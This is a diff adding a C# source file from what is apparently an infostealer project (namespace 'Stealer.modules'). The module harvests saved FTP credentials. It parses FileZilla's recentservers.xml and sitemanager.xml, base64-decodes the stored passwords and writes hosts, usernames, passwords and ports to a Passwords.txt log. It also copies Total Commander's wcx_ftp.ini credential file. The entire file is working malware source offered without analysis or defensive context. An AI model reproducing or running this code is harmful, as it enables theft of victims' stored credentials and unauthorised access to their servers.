@@ -1,0 +1,119 @@
+﻿using System;
+using System.IO;
+using System.Text;
+using System.Xml;
+
+namespace Stealer.modules
+{
+  internal class FTPClient
+  {
+    public static void GetFTPClient()
+    {
+      FTPClient.GetFileZilla();
+	  TotalCommander();
+    }
+
+    public static void GetFileZilla()
+    {
+      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml";
+      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml";
+      string str3 = Program.path + "\\FTP";
+      if (File.Exists(str1))
+      {
+        if (!Directory.Exists(str3))
+        {
+          Directory.CreateDirectory(str3);
+          Directory.CreateDirectory(str3 + "\\Filezilla");
+        }
+        else
+          Directory.CreateDirectory(str3 + "\\Filezilla");
+        FTPClient.HelpFiLeZilla(str1, str3, true);
+      }
+      if (!File.Exists(str2))
+        return;
+      if (!Directory.Exists(str3))
+      {
+        Directory.CreateDirectory(str3);
+        Directory.CreateDirectory(str3 + "\\Filezilla");
+      }
+      else
+        Directory.CreateDirectory(str3 + "\\Filezilla");
+      FTPClient.HelpFiLeZilla(str2, str3, false);
+    }
+
+    public static void HelpFiLeZilla(string zilla, string PathToLogsFolder, bool newVersion)
+    {
+      if (newVersion)
+      {
+        XmlDocument xmlDocument = new XmlDocument();
+        xmlDocument.Load(zilla);
+        foreach (XmlElement xmlElement in ((XmlElement) xmlDocument.GetElementsByTagName("RecentServers")[0]).GetElementsByTagName("Server"))
+        {
+          try
+          {
+            string innerText = xmlElement.GetElementsByTagName("Host")[0].InnerText;
+            if (innerText.Length > 3)
+            {
+              using (StreamWriter streamWriter = new StreamWriter(PathToLogsFolder + "\\Filezilla\\Passwords.txt", true))
+                streamWriter.WriteLine("\n[PASSWORDS]\nHost: " + innerText + "\nUser: " + xmlElement.GetElementsByTagName("User")[0].InnerText + "\nPassword: " + Encoding.Default.GetString(Convert.FromBase64String(xmlElement.GetElementsByTagName("Pass")[0].InnerText)) + "\nPort: " + xmlElement.GetElementsByTagName("Port")[0].InnerText);
+            }
+          }
+          catch
+          {
+          }
+        }
+      }
+      else
+      {
+        XmlDocument xmlDocument = new XmlDocument();
+        xmlDocument.Load(zilla);
+        foreach (XmlElement xmlElement in ((XmlElement) xmlDocument.GetElementsByTagName("Servers")[0]).GetElementsByTagName("Server"))
+        {
+          try
+          {
+            string innerText = xmlElement.GetElementsByTagName("Host")[0].InnerText;
+            if (innerText.Length > 3)
+            {
+              using (StreamWriter streamWriter = new StreamWriter(PathToLogsFolder + "\\Filezilla\\Passwords.txt", true))
+                streamWriter.WriteLine("\n[PASSWORDS]\nHost: " + innerText + "\nUser: " + xmlElement.GetElementsByTagName("User")[0].InnerText + "\nPassword: " + Encoding.Default.GetString(Convert.FromBase64String(xmlElement.GetElementsByTagName("Pass")[0].InnerText)) + "\nPort: " + xmlElement.GetElementsByTagName("Port")[0].InnerText);
+            }
+          }
+          catch
+          {
+          }
+        }
+      }
+    }
+	
+	private static void TotalCommander()
+    {
+		string str3h = Program.path + "\\FTP";
+		string app = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+			try
+			{
+				string text2 = app + "\\GHISLER\\";
+				if (Directory.Exists(text2))
+				{
+					if (!Directory.Exists(str3h)){
+						Directory.CreateDirectory(str3h);
+						Directory.CreateDirectory(str3h + "\\FTP\\Total Commander");
+					}
+					else
+					{
+						Directory.CreateDirectory(str3h + "\\FTP\\Total Commander");
+					}
+                }
+				FileInfo[] files = new DirectoryInfo(text2).GetFiles();
+				for (int i = 0; i < files.Length; i++)
+				{
+					if (files[i].Name.Contains("wcx_ftp.ini"))
+					{
+                       
+                        File.Copy(text2 + "wcx_ftp.ini", str3h + "\\FTP\\Total Commander\\wcx_ftp.ini");
+                    }
+				}
+			}
+			catch {}
+	}
+  }
+}
